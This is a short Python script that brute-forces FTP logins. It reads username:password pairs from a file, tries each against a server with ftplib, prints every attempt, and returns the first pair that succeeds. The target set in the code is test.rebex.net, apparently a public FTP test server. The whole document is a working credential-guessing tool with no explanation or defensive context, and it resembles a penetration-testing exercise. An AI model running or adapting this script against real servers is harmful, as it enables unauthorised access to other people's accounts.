import ftplib

def Brute(hostname,passFile):
    pF=open(passFile,'r')
    for passwd in pF.readlines():
        username=passwd.split(':')[0]
        password=passwd.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: '+ username+'/'+password)
        try:
            ftp=ftplib.FTP(hostname)
            ftp.login(username,password)
            print('[+] FTP Logon Succeeded: '+username+'/'+password)
            ftp.quit()
            return (username,password)
        except Exception as a:
            print(a)
    print('[-] FTP Logon Brute Force Failed')
    return (None,None)


host='test.rebex.net'
passFile='pass.txt'
r=Brute(host,passFile)
print(r)